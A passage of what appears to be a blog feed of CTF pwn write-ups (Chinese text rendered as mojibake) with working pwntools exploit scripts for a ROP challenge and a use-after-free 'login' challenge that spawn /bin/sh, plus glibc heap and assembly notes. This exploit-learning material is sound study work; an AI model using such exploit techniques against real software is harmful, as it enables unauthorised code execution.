class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span><span class="params">(signum=None, stack=None)</span>:</span></span><br><span class="line">    print(<span class="string">'Strip  all debugging information'</span>)</span><br><span class="line">    os.system(<span class="string">'rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script'</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sig <span class="keyword">in</span> [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: </span><br><span class="line">    signal.signal(sig, clear)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # Create a symbol file for GDB debugging</span></span><br><span class="line"><span class="comment"># try:</span></span><br><span class="line"><span class="comment">#     gdb_symbols = '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     f = open('/tmp/gdb_symbols.c', 'w')</span></span><br><span class="line"><span class="comment">#     f.write(gdb_symbols)</span></span><br><span class="line"><span class="comment">#     f.close()</span></span><br><span class="line"><span class="comment">#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')</span></span><br><span class="line"><span class="comment">#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')</span></span><br><span class="line"><span class="comment"># except Exception as e:</span></span><br><span class="line"><span class="comment">#     pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">execve_file = <span class="string">'./pwn'</span></span><br><span class="line"><span class="comment"># sh = process(execve_file, env=&#123;'LD_PRELOAD': '/tmp/gdb_symbols.so'&#125;)</span></span><br><span class="line">sh = process(execve_file)</span><br><span class="line"><span class="comment"># sh = remote('47.104.190.38', 12001)</span></span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line"><span class="comment"># libc = ELF('./libc-2.27.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create temporary files for GDB debugging</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    gdbscript = <span class="string">'''</span></span><br><span class="line"><span class="string">    b *0x8048c5b</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">'/tmp/gdb_pid'</span>, <span class="string">'w'</span>)</span><br><span class="line">    f.write(str(proc.pidof(sh)[<span class="number">0</span>]))</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">'/tmp/gdb_script'</span>, <span class="string">'w'</span>)</span><br><span class="line">    f.write(gdbscript)</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'index:\n'</span>, str(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">xchg ecx, esp</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">sh.sendafter(<span class="string">' much!\n'</span>, payload)</span><br><span class="line">sh.sendlineafter(<span class="string">'size:\n'</span>, str(<span class="number">0x1ff</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">layout = [</span><br><span class="line">    <span class="number">0x08072fb1</span>, <span class="comment">#: pop edx; pop ecx; pop ebx; ret; </span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x80f6d40</span>,</span><br><span class="line">    <span class="number">0x080c11e6</span>, <span class="comment">#: pop eax; ret; </span></span><br><span class="line">    <span class="number">11</span>,</span><br><span class="line">    <span class="number">0x080738c0</span>, <span class="comment">#: int 0x80; ret; </span></span><br><span class="line">]</span><br><span class="line">sh.sendafter(<span class="string">'me:\n'</span>, flat(layout).ljust(<span class="number">0x80</span>, <span class="string">'\0'</span>) + <span class="string">'/bin/sh\0'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">clear()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ±‡ç¼–ç¬”è®°</title>
      <link href="/2019/11/11/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/11/11/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>popæŒ‡ä»¤é¦–å…ˆæŠŠESPæŒ‡å‘çš„å †æ ˆå…ƒç´ å†…å®¹å¤åˆ¶åˆ°ä¸€ä¸ª32ä½æˆ–64ä½çš„æ“ä½œæ•°ä¸­ï¼Œå†å¢åŠ ESPçš„å€¼ã€‚å¦‚æœæ“ä½œæ•°æ˜¯32ä½çš„ï¼ŒESP+4ï¼Œå¦‚æœæ“ä½œæ•°æ˜¯64ä½çš„ï¼ŒESP+8ã€‚</p><p>â€‹    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop reg/mem32</span><br><span class="line"></span><br><span class="line">pop reg/mem32</span><br></pre></td></tr></table></figure><h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>pushæŒ‡ä»¤é¦–å…ˆå‡å°‘ESPçš„å€¼ï¼Œå†å°†æºæ“ä½œæ•°å¤åˆ¶åˆ°å †æ ˆã€‚å¦‚æœæ“ä½œæ•°æ˜¯32ä½çš„ï¼ŒESP-4ï¼Œå¦‚æœæ“ä½œæ•°æ˜¯64ä½çš„ï¼ŒESP-8ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push reg/mem32</span><br><span class="line">push reg/mem64</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äº”å±Šä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›</title>
      <link href="/2019/11/05/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
      <url>/2019/11/05/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>è¿™é¢˜æ²¡æœ‰showï¼Œdeleteé‡Œå­˜åœ¨uafæ¼æ´ï¼Œå¤šäº†ä¸€ä¸ªloginï¼Œé‡Œé¢æœ‰strcmpå‡½æ•°ï¼Œæ ¹æ®ä½ è¾“å…¥çš„é•¿åº¦sizeï¼Œcontentä¸å †é‡Œä¿å­˜çš„æ•°æ®è¿›è¡Œé•¿åº¦ä¸ºsizeçš„contentå¯¹æ¯”ã€‚</p><p>addé‡Œåœ¨ä½ mallocä¸€ä¸ªå †å—åï¼Œåˆä¼šè‡ªè¡Œmallocä¸€ä¸ªsizeä¸º0x20çš„å †å—ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ä½ çš„ptr  â†å°±æ˜¯æˆ‘ä»¬åˆ©ç”¨çš„ç‚¹äº†ã€‚</p><p>è´´ä¸Šexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">'linux'</span> , arch = <span class="string">'amd64'</span> , log_level = <span class="string">'debug'</span>)</span><br><span class="line">sh = process(<span class="string">'./login'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./login'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">login</span><span class="params">(index,password)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"id:\n"</span>,str(index))</span><br><span class="line">sh.sendlineafter(<span class="string">"length:\n"</span>,str(len(password)))</span><br><span class="line">sh.sendlineafter(<span class="string">"password:\n"</span>,password)</span><br><span class="line">d = sh.recvline().strip()</span><br><span class="line"><span class="keyword">if</span> d == <span class="string">'Login success!'</span>:</span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="comment">#è¿™é‡Œå°±æ˜¯çˆ†ç ´å¯¹æ¯”</span></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">guess</span><span class="params">(index,prefix)</span>:</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">  <span class="keyword">if</span>(login(index,chr(i)+prefix)):</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="comment">#è¿™é‡Œå°±æ˜¯ä»7få¼€å§‹æ¯”å¯¹ï¼Œæ‰§è¡Œ6æ¬¡</span></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line"> addr=<span class="string">''</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">edit(<span class="number">4</span>,chr(<span class="number">0x95</span>-i))</span><br><span class="line">addr = chr(guess(<span class="number">0</span>,addr))+addr</span><br><span class="line"> <span class="keyword">return</span> u64(<span class="string">'\x00'</span>+addr + <span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">edit</span><span class="params">(index,password)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'4'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"id:\n"</span>,str(index))</span><br><span class="line">sh.sendlineafter(<span class="string">"pass:\n"</span>,password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">add</span><span class="params">(index,password)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'2'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"id:\n"</span>,str(index))</span><br><span class="line">sh.sendlineafter(<span class="string">"length:\n"</span>,str(len(password)))</span><br><span class="line">sh.sendlineafter(<span class="string">"password:\n"</span>,password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"id:\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">z</span><span class="params">(commond=<span class="string">''</span>)</span>:</span></span><br><span class="line">gdb.attach(sh,commond)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x90</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x30</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">4</span>,<span class="string">'\x90'</span>)<span class="comment">#1</span></span><br><span class="line">base = leak()<span class="number">-0x3c4b00</span></span><br><span class="line">log.success(<span class="string">'libc.addr = '</span> + hex(base))</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">binsh = base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system = base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">add(<span class="number">5</span>,p64(binsh)+p64(system))</span><br><span class="line">sh.sendlineafter(<span class="string">'Choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'id:\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">password = <span class="string">'/bin/sh'</span></span><br><span class="line">sh.sendlineafter(<span class="string">'length:\n'</span>,str(len(password)))</span><br><span class="line">sh.sendafter(<span class="string">'password:\n'</span>,password)</span><br><span class="line">exploit()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>ï¼ˆçˆ†ç ´çš„æ„Ÿè§‰æœ‰ç‚¹çˆ½ï¼‰</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å †çš„æ•´ç†</title>
      <link href="/2019/10/29/%E2%80%9C%E5%A0%86%E7%9A%84%E6%95%B4%E7%90%86%E2%80%9D/"/>
      <url>/2019/10/29/%E2%80%9C%E5%A0%86%E7%9A%84%E6%95%B4%E7%90%86%E2%80%9D/</url>
      
        <content type="html"><![CDATA[<h3 id="å †çš„ç»“æ„"><a href="#å †çš„ç»“æ„" class="headerlink" title="å †çš„ç»“æ„"></a>å †çš„ç»“æ„</h3><p>malloc chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>free chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&apos; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&apos; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>åœ¨fasted binä¸­æ˜¯LIFO</p><p>åœ¨unsorted bin ä¸­æ˜¯FIFO</p><h3 id="å †å æŠ€å·§"><a href="#å †å æŠ€å·§" class="headerlink" title="å †å æŠ€å·§"></a>å †å æŠ€å·§</h3><p> <a href="http://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html" target="_blank" rel="noopener">http://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html</a> </p><p>è¿™ä½å¸ˆå‚…çš„blogé‡Œè®²çš„å¾ˆè¯¦ç»†äº†ã€‚</p><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>malloc_consolidate() å‡½æ•°æ˜¯å®šä¹‰åœ¨ malloc.c ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°† fastbin ä¸­çš„ç©ºé—² chunk åˆå¹¶æ•´ç†åˆ° unsorted_bin ä¸­ä»¥åŠè¿›è¡Œåˆå§‹åŒ–å †çš„å·¥ä½œï¼Œåœ¨ malloc() ä»¥åŠ free() ä¸­å‡æœ‰å¯èƒ½è°ƒç”¨ malloc_consolidate() å‡½æ•°ã€‚</p><h4 id="malloc-consolidateè°ƒç”¨æ¡ä»¶"><a href="#malloc-consolidateè°ƒç”¨æ¡ä»¶" class="headerlink" title="malloc_consolidateè°ƒç”¨æ¡ä»¶"></a>malloc_consolidateè°ƒç”¨æ¡ä»¶</h4><h5 id="1-malloc-large-bin"><a href="#1-malloc-large-bin" class="headerlink" title="1. malloc large bin"></a>1. malloc large bin</h5><p> å‡å¦‚mallocçš„sizeå¤§äºsmall binçš„èŒƒå›´ï¼Œå…ˆè°ƒç”¨malloc_consolidateå°†fastbin åˆå¹¶ä¸ºunsorted bin </p><p>åœ¨64ä½ç³»ç»Ÿä¸‹ï¼Œsmall bin &lt;0x400</p><p>åœ¨32ä½ç³»ç»Ÿä¸‹ï¼Œsmall bin &lt;0x200</p><h5 id="2-top-chunkä¸å¤Ÿç©ºé—´"><a href="#2-top-chunkä¸å¤Ÿç©ºé—´" class="headerlink" title="2. top chunkä¸å¤Ÿç©ºé—´"></a>2. top chunkä¸å¤Ÿç©ºé—´</h5><p>ä¸‹é¢æ˜¯ç®€å•çš„æµ‹è¯•ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line"><span class="keyword">void</span>* h1 = <span class="built_in">malloc</span>(<span class="number">0x68</span>);    </span><br><span class="line"><span class="keyword">void</span>* h2 = <span class="built_in">malloc</span>(<span class="number">0x20e48</span>);    </span><br><span class="line"><span class="built_in">free</span>(h1);    </span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x300</span>);    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-åœ¨freeå‡½æ•°åœ¨å„ç§åˆå¹¶å‰åchunkä¹‹åçš„sizeå¤§äºFASTBIN-CONSOLIDATION-THRESHOLD-ä¹Ÿå°±æ˜¯65536"><a href="#3-åœ¨freeå‡½æ•°åœ¨å„ç§åˆå¹¶å‰åchunkä¹‹åçš„sizeå¤§äºFASTBIN-CONSOLIDATION-THRESHOLD-ä¹Ÿå°±æ˜¯65536" class="headerlink" title="3. åœ¨freeå‡½æ•°åœ¨å„ç§åˆå¹¶å‰åchunkä¹‹åçš„sizeå¤§äºFASTBIN_CONSOLIDATION_THRESHOLD ä¹Ÿå°±æ˜¯65536"></a>3. åœ¨freeå‡½æ•°åœ¨å„ç§åˆå¹¶å‰åchunkä¹‹åçš„sizeå¤§äºFASTBIN_CONSOLIDATION_THRESHOLD ä¹Ÿå°±æ˜¯65536</h5><p>æ¯”è¾ƒå®¹æ˜“å®ç°çš„æ˜¯ä¸top chunkåˆå¹¶åsizeå¤§äºFASTBIN_CONSOLIDATION_THRESHOLD å…·ä½“å¤§æ¦‚æ˜¯ä¸‹é¢çš„æµç¨‹</p><ol><li>åˆ¤æ–­chunkæ˜¯å¦å±äºfastbinï¼Œå¦‚æœä¸æ˜¯ï¼Œç»§ç»­</li><li>åˆ¤æ–­chunkæ˜¯å¦å±äºmapçš„ï¼Œå¦‚æœä¸æ˜¯ï¼Œç»§ç»­</li><li>å‡å¦‚ä¸‹ä¸€ä¸ªchunkæ˜¯top chunkï¼Œåˆå¹¶</li><li>åˆ¤æ–­å½“å‰chunkçš„sizeæ˜¯å¦å¤§äºFASTBIN_CONSOLIDATION_THRESHOLDï¼Œå‡å¦‚å¤§äºï¼Œè°ƒç”¨malloc_consolidate</li></ol><p>æµ‹è¯•ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line"><span class="keyword">void</span>* h1 = <span class="built_in">malloc</span>(<span class="number">0x68</span>);    </span><br><span class="line"><span class="keyword">void</span>* h2 = <span class="built_in">malloc</span>(<span class="number">0xa8</span>);    </span><br><span class="line"><span class="keyword">void</span>* h3 = <span class="built_in">malloc</span>(<span class="number">0xa8</span>);    </span><br><span class="line"><span class="built_in">free</span>(h1);    </span><br><span class="line"><span class="built_in">free</span>(h3);    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å †çš„leakå¤§è‡´æ–¹æ³•"><a href="#å †çš„leakå¤§è‡´æ–¹æ³•" class="headerlink" title="å †çš„leakå¤§è‡´æ–¹æ³•"></a>å †çš„leakå¤§è‡´æ–¹æ³•</h3><p>é¦–å…ˆéœ€è¦leakçš„å†…å®¹ï¼š</p><p>1.ä¸»æ¨¡å—çš„åŸºåœ°å€</p><p>2.heapçš„åŸºåœ°å€</p><p>3.libc.soçš„åŸºåœ°å€</p><p>å¸¸è§„æµç¨‹æ˜¯é€šè¿‡è·å–main_arenaåœ°å€ï¼Œå› ä¸ºmain_arenaå­˜åœ¨äºlibc.soä¸­å¯ä»¥é€šè¿‡è®¡ç®—åç§»å¾—åˆ°libc.soçš„åŸºåœ°å€ã€‚å†æ ¹æ®main_arenaåœ°å€è·å¾—hookåœ°å€</p><p>ç„¶åè¦ä¹ˆsystem + binsh  è¦ä¹ˆone_gadget   getshell</p><p>å¯ä¾›leakçš„æ¼æ´</p><ul><li>å †å†…å­˜æœªåˆå§‹åŒ–</li><li>å †æº¢å‡º</li><li>Use-After-Free</li><li>è¶Šç•Œè¯»</li><li>heap extend</li></ul><p>ä»¥ä¸Šéƒ½å¯ä»¥è¿›è¡Œleakã€‚</p><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p> uafæ¼æ´äº§ç”Ÿçš„ä¸»è¦åŸå› æ˜¯é‡Šæ”¾äº†ä¸€ä¸ªå 